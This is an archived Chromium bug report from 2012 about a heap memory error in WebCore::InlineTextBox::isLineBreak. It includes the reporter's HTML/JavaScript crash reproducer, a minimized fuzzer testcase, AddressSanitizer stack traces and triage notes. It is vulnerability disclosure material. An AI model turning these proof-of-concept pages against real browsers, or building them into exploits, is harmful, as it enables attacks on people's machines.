# Regression(r109014): Heap-use-after-free in WebCore::InlineTextBox::isLineBreak

| Field | Value |
|-------|-------|
| **Issue ID** | [40055129](https://issues.chromium.org/issues/40055129) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | oj...@chromium.org |
| **Created** | 2012-03-16 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

heap buffer overflow in WebCore::InlineTextBox::isLineBreak()

VERSION dev, not beta or stable

Chrome Version:  

Chromium 19.0.1070.0 (Developer Build 126778)  

OS Linux  

WebKit 536.3 (@110733)

Operating System: 64bit linux

**REPRODUCTION CASE**

number of A's --> different offsets and buffer size. I didn't mess around with the redzone size, so that 100 to the left is a bit misleading. style for first-letter and first-child can be anything.

<html>
<head>
<style>
#el0 {
display: -webkit-inline-flexbox;
}
#el0::first-letter {
height: 10px;
}
#el0:first-child {
height: 10px;
}
</style>
<script>
onload = function() {
el0=document.createElement('div')
el0.setAttribute('id','el0')
document.body.appendChild(document.createElement('img'))
document.body.appendChild(el0)
document.body.appendChild(document.createElement('div'))
document.body.appendChild(document.createElement('img'))
el1=document.createElement('div')
document.body.appendChild(el1)
el2=document.createElement('pre')
el0.appendChild(el2)
el2.appendChild(document.createTextNode(Array(1024).join('A')+unescape('%u0600')+'A'))
document.designMode='on'
window.getSelection().setBaseAndExtent(el1, 0, el0, 1)
document.execCommand('InsertLineBreak')
document.body.appendChild(document.createElement('img'))
document.designMode='on'
document.execCommand('selectall')
document.execCommand('CreateLink', 0, '#')
document.execCommand('FormatBlock', false, '<'+'pre>')
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==21868== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7fffc5b72b9c at pc 0x55555aa1148a bp 0x7fffffff6860 sp 0x7fffffff6858  

READ of size 2 at 0x7fffc5b72b9c thread T0  

#0 0x55555aa1148a in WebCore::InlineTextBox::isLineBreak() const ???:0  

#1 0x55555aa22a9d in WebCore::InlineTextBox::containsCaretOffset(int) const ???:0  

#2 0x5555593258dd in WebCore::Position::inRenderedText() const ???:0

0x7fffc5b72b9c is located 100 bytes to the left of 0-byte region [0x7fffc5b72c00,0x7fffc5b72c00)

## Attachments

- [0100.txt](attachments/0100.txt) (text/x-c; charset=us-ascii, 8.1 KB)
- [0100.html](attachments/0100.html) (text/html; charset=us-ascii, 1.2 KB)
- [118662_sym.txt](attachments/118662_sym.txt) (text/plain; charset=us-ascii, 17.8 KB)

## Timeline

### [Deleted User] (2012-03-16)

filed upstream https://bugs.webkit.org/show_bug.cgi?id=81406

### [Deleted User] (2012-03-16)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-17)

Ojan, can you please take a look, this might be coming from https://trac.webkit.org/changeset/109014/. ClusterFuzz regression range is https://trac.webkit.org/log/?verbose=on&stop_rev=109008&rev=109131&limit=1000

### in...@chromium.org (2012-03-17)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=26915342

Uploader: cdn@chromium.org

Crash Type: Heap-use-after-free READ 2
Crash Address: 0x7f0a84cad19e
Crash State:
  - crash stack -
  WebCore::InlineTextBox::isLineBreak
  WebCore::InlineTextBox::containsCaretOffset
  - free stack -
  pthread_create
  base::
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=124014:124069

Minimized Testcase (0.92 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96vkov3p-8bzkT1weWj3jWysaVMx4F55PB95fN3WeuCNjXB6qfnSAeJFB8tUGBpKf_04nk7ofpodgUxiJYTW_1isNCibOABTuDpfUHTVA28ky4_7PBu2U5nYi-6-zW5nkuO45nRLNeYRCCls6onoPwjQlhBEg
<style>
      #el0 {
        display: -webkit-inline-flexbox;
      }
      #el0::first-letter {
        height: 10px;
      }
      #el0:first-child {
        height: 10px;
</style>
    <script>
      onload = function() {
        el0=document.createElement('div')
        el0.setAttribute('id','el0')
        document.body.appendChild(document.createElement('img'))
        document.body.appendChild(el0)
        document.body.appendChild(document.createElement('img'))
        el1=document.createElement('div')
        el2=document.createElement('pre')
        el0.appendChild(el2)
        el2.appendChild(document.createTextNode(Array(1024).join('A')+unescape('%u0600')+'A'))
        document.execCommand('InsertLineBreak')
        document.designMode='on'
        document.execCommand('selectall')
        document.execCommand('CreateLink', 0, '#')
        document.execCommand('FormatBlock', false, '<'+'pre>')
      }
    </script>

### kc...@chromium.org (2012-03-17)

If you run it with ASAN_OPTIONS=redzone=4096 you will get 

0x7f7e42b9b81c is located 2042 bytes to the right of 34-byte region [0x7f7e42b9b000,0x7f7e42b9b022)                                                                                                 
allocated by thread T15 here:                                                                                                                                                                       
    #0 0x7f7e92b845c2 in malloc ??:0                                                                                                                                                                
    #1 0x7f7e8e117a0b in WTF::fastMalloc(unsigned long) third_party/WebKit/Source/JavaScriptCore/wtf/FastMalloc.cpp:268                                                                             
    #2 0x7f7e8e136f04 in WTF::StringImpl::createUninitialized(unsigned int, unsigned short*&) third_party/WebKit/Source/JavaScriptCore/wtf/text/StringImpl.cpp:112                                  
    #3 0x7f7e8e14b037 in WTF::PassRefPtr<WTF::StringImpl>::leakRef() const third_party/WebKit/Source/JavaScriptCore/wtf/PassRefPtr.h:161                                                            
    #4 0x7f7e8e0d876d in WebCore::CharacterData::deleteData(unsigned int, unsigned int, int&) third_party/WebKit/Source/WebCore/dom/CharacterData.cpp:130                                           
    #5 0x7f7e8f5fe35f in WebCore::SplitTextNodeCommand::insertText1AndTrimText2() third_party/WebKit/Source/WebCore/editing/SplitTextNodeCommand.cpp:105                                            
    #6 0x7f7e8f5fde86 in WebCore::SplitTextNodeCommand::doApply() third_party/WebKit/Source/WebCore/editing/SplitTextNodeCommand.cpp:66         

Looks a bit unusual... 

### in...@chromium.org (2012-03-19)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-19)

http://trac.webkit.org/changeset/111237

### sc...@gmail.com (2012-03-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-05-04)

Looks like an OOB read -> severity to medium.

### sc...@gmail.com (2012-05-04)

OOB read; perhaps it can be recovered? Let's err on the side of caution and reward:
$500

### sc...@gmail.com (2012-05-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-14)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/118662?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055129)*
